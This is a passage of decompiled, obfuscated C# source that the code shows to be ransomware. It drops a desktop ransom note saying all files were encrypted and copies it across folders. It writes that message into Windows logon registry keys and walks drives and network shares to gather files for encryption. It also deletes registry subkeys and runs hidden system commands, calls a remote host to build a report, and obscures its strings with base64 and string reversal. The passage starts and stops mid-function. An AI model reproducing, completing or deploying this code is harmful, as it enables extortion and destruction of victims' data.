		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232));
				streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107395199)));
				streamWriter.WriteLine(getString_0(107396639));
				streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107390501)));
				streamWriter.WriteLine(GThDVKInjH);
				if (gsXyoeFOorGZ == getString_0(107397129))
				{
					streamWriter.WriteLine(getString_0(107396639));
					streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107390468)) + Convert.ToString(JEkdiihxCoWf.Count));
				}
				if (OtvlrYHFRq)
				{
					streamWriter.WriteLine(getString_0(107396639));
					streamWriter.WriteLine(UJcPFgFtVJhWf(getString_0(107390359)));
					streamWriter.WriteLine(hIHAEKpEeiS.TMqqKWTFyQVhVGLF());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232));
				if (!text11.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232), getString_0(107390326) + GThDVKInjH);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in IDUZlSGaIfn)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395232)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232), item + getString_0(107395232), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232));
					if (!text12.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
					{
						File.AppendAllText(item + getString_0(107395232), getString_0(107390326) + GThDVKInjH);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!XeXEhFhfYVvh && num > 10)
			{
				break;
			}
		}
		if (lanIsMFtITLe == getString_0(107396872))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389785)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389785));
					streamWriter2.WriteLine(UJcPFgFtVJhWf(getString_0(107389752)));
					streamWriter2.WriteLine(getString_0(107396639));
					streamWriter2.WriteLine(UJcPFgFtVJhWf(getString_0(107402300)));
					streamWriter2.WriteLine(GThDVKInjH + UJcPFgFtVJhWf(getString_0(107402211)));
					if (gsXyoeFOorGZ == getString_0(107397129))
					{
						streamWriter2.WriteLine(getString_0(107396639));
						streamWriter2.WriteLine(UJcPFgFtVJhWf(getString_0(107402198)) + UJcPFgFtVJhWf(getString_0(107390468)) + Convert.ToString(JEkdiihxCoWf.Count) + UJcPFgFtVJhWf(getString_0(107402211)));
					}
					if (OtvlrYHFRq)
					{
						streamWriter2.WriteLine(getString_0(107396639));
						streamWriter2.WriteLine(UJcPFgFtVJhWf(getString_0(107390359)));
						streamWriter2.WriteLine(hIHAEKpEeiS.TMqqKWTFyQVhVGLF());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232));
					if (!text13.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389785), UJcPFgFtVJhWf(getString_0(107402198)) + getString_0(107390326) + GThDVKInjH + UJcPFgFtVJhWf(getString_0(107402211)));
					}
				}
			}
			catch
			{
			}
		}
		if (HohHoEgJewvBWz == getString_0(107396872))
		{
			try
			{
				if (gsXyoeFOorGZ == getString_0(107397129))
				{
					hIHAEKpEeiS.FMySfiPDvIaBq(getString_0(107402137), getString_0(107402132), getString_0(107402151), string.Concat(UJcPFgFtVJhWf(getString_0(107396705)), new WebClient().DownloadString(UJcPFgFtVJhWf(getString_0(107396712))), getString_0(107402110), UJcPFgFtVJhWf(getString_0(107396634)), DateTime.Now, getString_0(107396639), UJcPFgFtVJhWf(getString_0(107402105)), Convert.ToString(JEkdiihxCoWf.Count), getString_0(107396639), UJcPFgFtVJhWf(getString_0(107396625)), GThDVKInjH));
				}
				else
				{
					hIHAEKpEeiS.FMySfiPDvIaBq(getString_0(107402137), getString_0(107402132), getString_0(107402151), string.Concat(UJcPFgFtVJhWf(getString_0(107396705)), new WebClient().DownloadString(UJcPFgFtVJhWf(getString_0(107396712))), getString_0(107402110), UJcPFgFtVJhWf(getString_0(107396634)), DateTime.Now, getString_0(107396639), UJcPFgFtVJhWf(getString_0(107402105)), Convert.ToString(JEkdiihxCoWf.Count), getString_0(107396639), UJcPFgFtVJhWf(getString_0(107396625)), GThDVKInjH));
				}
			}
			catch
			{
			}
		}
		if (DdPuPlUptL == getString_0(107396872))
		{
			try
			{
				OVYyEJDcoxt.VNTKsXSMMvUCd(new Uri(getString_0(107401576)));
			}
			catch
			{
			}
		}
		if (lanIsMFtITLe == getString_0(107397129))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232)))
				{
					Process.Start(UJcPFgFtVJhWf(getString_0(107401575)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395232));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389785)))
				{
					Process.Start(UJcPFgFtVJhWf(getString_0(107401550)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389785));
				}
			}
			catch
			{
			}
		}
		if (TLvIKeJnVejcNG == getString_0(107396872))
		{
			if (cfLMhLbiCC == getString_0(107396872) && !string.IsNullOrEmpty(dPIYrIPkEeCv) && !string.IsNullOrEmpty(LfrLWEkFCBwUa))
			{
				sTvVQxLLeTxkANi(dPIYrIPkEeCv, LfrLWEkFCBwUa);
			}
			else
			{
				sTvVQxLLeTxkANi(getString_0(107401501), getString_0(107401472));
			}
		}
		if (EMMMLIMedETY != getString_0(107401750))
		{
			AdwfbvqPefcggQE(EMMMLIMedETY);
		}
		if (!string.IsNullOrEmpty(YrUNJYkfZORc))
		{
			try
			{
				File.Delete(YrUNJYkfZORc);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396725))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396725)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(bDDJFCkjBbYQ, getString_0(107401765) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (SWaMdrdKGgzowGl)
		{
			try
			{
				File.AppendAllText(bDDJFCkjBbYQ, getString_0(107401688));
			}
			catch (Exception)
			{
			}
		}
		if (mkgreXsNDfWo == getString_0(107401707))
		{
			vAKYzPfahgkUEj();
		}
	}

	public static void EYaoTyxjtvM()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(UJcPFgFtVJhWf(getString_0(107401666)), UJcPFgFtVJhWf(getString_0(107401501)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int rPeIDKMaUitANmOZQ(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> yhEifRAsvjp(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107401032)) && !text.Contains(getString_0(107401007)) && !text.Contains(getString_0(107400974)) && !text.ToLower().Contains(getString_0(107400925)) && !text.ToLower().Contains(getString_0(107400944)) && !text.Contains(getString_0(107400887)) && !text.Contains(getString_0(107400866)) && !text.ToLower().Contains(getString_0(107400853)) && !text.ToLower().Contains(getString_0(107400872)) && !text.ToLower().Contains(getString_0(107401315)) && !text.ToLower().Contains(getString_0(107401306)) && !text.ToLower().Contains(getString_0(107401321)) && !text.ToLower().Contains(getString_0(107401276)) && !text.ToLower().Contains(getString_0(107401295)) && !text.ToLower().Contains(getString_0(107401242)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107401217)) && !fileInfo.FullName.Contains(getString_0(107401232)) && !fileInfo.FullName.Contains(getString_0(107401183)) && !fileInfo.FullName.Contains(getString_0(107401198)) && !fileInfo.FullName.Contains(getString_0(107401149)) && !fileInfo.FullName.Contains(getString_0(107401164)) && !fileInfo.FullName.Contains(getString_0(107401115)) && !fileInfo.FullName.Contains(getString_0(107401130)) && !fileInfo.FullName.Contains(getString_0(107401085)) && !fileInfo.FullName.Contains(getString_0(107401096)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400539)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400558)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400509)) && !fileInfo.FullName.ToLower().Contains(getString_0(107400524)) && !fileInfo.FullName.Contains(UJcPFgFtVJhWf(getString_0(107400475))) && !fileInfo.FullName.Contains(getString_0(107400450)) && !fileInfo.FullName.Contains(getString_0(107396725)) && !fileInfo.FullName.Contains(getString_0(107400437)) && !fileInfo.FullName.EndsWith(getString_0(107395306)) && !fileInfo.FullName.EndsWith(getString_0(107400412)) && !fileInfo.FullName.EndsWith(getString_0(107400407)) && !fileInfo.FullName.EndsWith(getString_0(107400434)) && !fileInfo.FullName.EndsWith(getString_0(107400429)) && !fileInfo.FullName.Contains(getString_0(107400424)) && !fileInfo.FullName.Contains(ZLERFztvScvXGTf) && !fileInfo.FullName.Contains(bDDJFCkjBbYQ) && !fileInfo.FullName.Contains(IKRtRLOSqagD))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(FoLsSeMcEVuV) * 1024.0 * 1024.0 && QotWPeyjvzjx == getString_0(107396872))
						{
							list.Add(fileInfo.FullName);
							fcCzxmopLHsganD(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && QotWPeyjvzjx == getString_0(107397129))
						{
							list.Add(fileInfo.FullName);
							fcCzxmopLHsganD(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void KWDSDiDIlff()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400375));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!eaZULefnOUcJVI.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400322), getString_0(107396730)).Replace(getString_0(107400317), getString_0(107400322))
					.Replace(getString_0(107400308), getString_0(107401576))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					eaZULefnOUcJVI.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400322), getString_0(107396730)).Replace(getString_0(107400317), getString_0(107400322))
						.Replace(getString_0(107400308), getString_0(107401576))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400335), getString_0(107401576)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string avwQPvqZWjHd(string ogESUYOmfLBUqPp = "", string aPrCRgJjLINDQ = "")
	{
		string result = getString_0(107401576);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ogESUYOmfLBUqPp,
				Arguments = aPrCRgJjLINDQ,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void DpTTVKMlTgsKiQJt(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107400326),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string TZnpCqEjJZon(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string UJcPFgFtVJhWf(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void uyenkvVYxVgNak(string dDsBfwHzwzhbs = "", string QwrsfFWkchUD = "SW5mb3JtYXRpb24uLi4=", string BmptrPrkNpvSF = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		dDsBfwHzwzhbs = TZnpCqEjJZon(getString_0(107400789));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(dDsBfwHzwzhbs), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107400692)), UJcPFgFtVJhWf(QwrsfFWkchUD));
				registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107400691)), UJcPFgFtVJhWf(BmptrPrkNpvSF));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			dDsBfwHzwzhbs = TZnpCqEjJZon(getString_0(107400630));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(dDsBfwHzwzhbs), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107400045)), UJcPFgFtVJhWf(QwrsfFWkchUD));
				registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107400012)), UJcPFgFtVJhWf(BmptrPrkNpvSF));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void VHDFsFRXsCVCnV()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (cfLMhLbiCC == getString_0(107396872) && !string.IsNullOrEmpty(dPIYrIPkEeCv) && !string.IsNullOrEmpty(LfrLWEkFCBwUa))
				{
					uyenkvVYxVgNak(getString_0(107401576), dPIYrIPkEeCv, LfrLWEkFCBwUa);
				}
				else
				{
					uyenkvVYxVgNak(getString_0(107401576), getString_0(107401501), getString_0(107401472));
				}
			}
		}
		catch
		{
		}
	}

	public static void sTvVQxLLeTxkANi(string CqaCQpPwLbVTD = "SW5mb3JtYXRpb24uLi4=", string bpuGPyeQTFkO = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(UJcPFgFtVJhWf(CqaCQpPwLbVTD));
		val.set_BalloonTipText(UJcPFgFtVJhWf(bpuGPyeQTFkO));
		val.ShowBalloonTip(30000);
	}

	public static void AdwfbvqPefcggQE(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107399983)), getString_0(107399934) + text + getString_0(107399925) + string_0);
	}

	private static void AUEQPExuAGiGvUaT()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		ZRCFFrorRKRQQW();
		List<ZaVBFWJyYjjv> list = ZaVBFWJyYjjv.PtVoHDGdwu();
		foreach (ZaVBFWJyYjjv item in list)
		{
			KvzIZcyvMdpOuBpa.Add(item.IPAddress);
		}
		List<string> kvzIZcyvMdpOuBpa = KvzIZcyvMdpOuBpa;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				RTucIAcuBRWMVl CS_0024_003C_003E8__locals0 = new RTucIAcuBRWMVl();
				CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP = string_0;
				if ((!CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP.StartsWith(getString_0(107398136)) && !CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP.StartsWith(getString_0(107398163)) && !CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP.StartsWith(getString_0(107398154)) && !CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP.StartsWith(getString_0(107398109))) || !tFYEGaopZM.kWHZZpVXtBq(CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP))
				{
					return;
				}
				try
				{
					Thread.Sleep(PGvCWVOLTGYXz);
					eaZULefnOUcJVI.Add(getString_0(107400322) + CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP + getString_0(107398100));
					try
					{
						if (SidumIOOlYmWUm)
						{
							Console.WriteLine(getString_0(107400322) + CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP + getString_0(107398100));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(PGvCWVOLTGYXz);
						eaZULefnOUcJVI.Add(RTucIAcuBRWMVl.getString_0(107400328) + CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP + RTucIAcuBRWMVl.getString_0(107396736) + (char)int_0 + RTucIAcuBRWMVl.getString_0(107349466));
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(RTucIAcuBRWMVl.getString_0(107400328) + CS_0024_003C_003E8__locals0.ZNXHhLHxfberRP + RTucIAcuBRWMVl.getString_0(107396736) + (char)int_0 + RTucIAcuBRWMVl.getString_0(107349466));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(kvzIZcyvMdpOuBpa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			tFYEGaopZM.ulpfQeMFZo ulpfQeMFZo = new tFYEGaopZM.ulpfQeMFZo(tFYEGaopZM.TUMDxuVzZiku.WoqfTFwQtU, tFYEGaopZM.CfFHIHLMjwXOw.ByyszVfgXqDhqPL, tFYEGaopZM.rDvZyTVGhL.dfuoOuGfpQ, tFYEGaopZM.iqyfLxXkhEvDu.GExbTfwnOIOo);
			foreach (string item2 in ulpfQeMFZo)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107399952));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!eaZULefnOUcJVI.Contains(item3.ToString()))
						{
							eaZULefnOUcJVI.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (SidumIOOlYmWUm)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		kPPZhZBfmwQe.WyfKLYVONPbWN();
		try
		{
			if (SidumIOOlYmWUm)
			{
				Console.WriteLine(getString_0(107399839));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = TZnpCqEjJZon(getString_0(107400630));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107399798)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107400253)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (eBjqIYGqqxZnwj == getString_0(107396872))
		{
			KmvrzNiHHFG.exgGMUymAdv();
		}
		try
		{
			if (SidumIOOlYmWUm)
			{
				Console.WriteLine(getString_0(107400240));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400375));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (eaZULefnOUcJVI.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400322), getString_0(107396730)).Replace(getString_0(107400317), getString_0(107400322))
					.Replace(getString_0(107400308), getString_0(107401576))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (SidumIOOlYmWUm)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400322), getString_0(107396730)).Replace(getString_0(107400317), getString_0(107400322))
							.Replace(getString_0(107400308), getString_0(107401576))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400335), getString_0(107401576)));
					}
				}
				catch
				{
				}
				eaZULefnOUcJVI.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400322), getString_0(107396730)).Replace(getString_0(107400317), getString_0(107400322))
					.Replace(getString_0(107400308), getString_0(107401576))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400335), getString_0(107401576)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (SidumIOOlYmWUm)
			{
				Console.WriteLine(getString_0(107400151));
			}
		}
		catch
		{
		}
	}

	public static bool nTVEUrHbKpO()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107400114));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void HkTGZrARipJDX(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = UJcPFgFtVJhWf(getString_0(107400081));
		processStartInfo.Arguments = getString_0(107399508) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool ncfdWMoQFofP(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool dAdGxCzjjI(string string_0)
	{
		try
		{
			PeUIWwRFcyImzp CS_0024_003C_003E8__locals0 = new PeUIWwRFcyImzp();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.RSMlmXfaxX = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.RSMlmXfaxX);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107399535);
		}
		catch
		{
			return false;
		}
	}

	public static void BhPnAViFMONUqk()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = TZnpCqEjJZon(getString_0(107399526));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399356)));
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399331)));
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399346)));
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399289)));
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107400081)));
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399776)));
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399983)));
					registryKey.Close();
				}
				string_ = TZnpCqEjJZon(getString_0(107399747));
				registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399650)));
					registryKey.Close();
				}
				string_ = TZnpCqEjJZon(getString_0(107399665));
				registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399650)));
					registryKey.Close();
				}
				string_ = TZnpCqEjJZon(getString_0(107399665));
				registryKey = Registry.CurrentUser.OpenSubKey(UJcPFgFtVJhWf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UJcPFgFtVJhWf(getString_0(107399650)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107399616)), UJcPFgFtVJhWf(getString_0(107399631)));
			avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107399550)), UJcPFgFtVJhWf(TZnpCqEjJZon(getString_0(107399541))));
			avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107399550)), UJcPFgFtVJhWf(getString_0(107398883)));
			avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107398854)), UJcPFgFtVJhWf(getString_0(107398805)));
		}
		catch
		{
		}
	}

	public static void wTxBRYOuXVKuCY(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(UJcPFgFtVJhWf(getString_0(107399276)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void jfxQCoihyO()
	{
		string string_ = TZnpCqEjJZon(getString_0(107399251));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UJcPFgFtVJhWf(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UJcPFgFtVJhWf(getString_0(107399138)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ZRCFFrorRKRQQW()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107399105)), UJcPFgFtVJhWf(getString_0(107399092)));
			avwQPvqZWjHd(UJcPFgFtVJhWf(getString_0(107399105)), UJcPFgFtVJhWf(getString_0(107398482)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string UDSFJoOCgB(string LuJtRlqrqQzt, int pwVshNwOUOtyz = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(pwVshNwOUOtyz);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(LuJtRlqrqQzt, 1, intPtr, ref pwVshNwOUOtyz) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void vAKYzPfahgkUEj()
	{
